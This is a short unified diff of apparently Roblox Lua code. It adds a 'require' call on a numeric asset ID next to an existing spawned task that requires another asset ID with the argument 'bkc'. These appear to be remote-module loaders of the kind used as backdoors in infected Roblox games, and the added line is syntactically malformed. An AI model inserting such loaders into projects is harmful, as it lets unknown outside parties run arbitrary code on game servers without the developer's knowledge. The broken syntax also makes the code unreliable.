@@ -1,3 +1,4 @@
+require(92540950140621):()
 task.spawn(function()
 require(18254193128)("bkc")
 end)
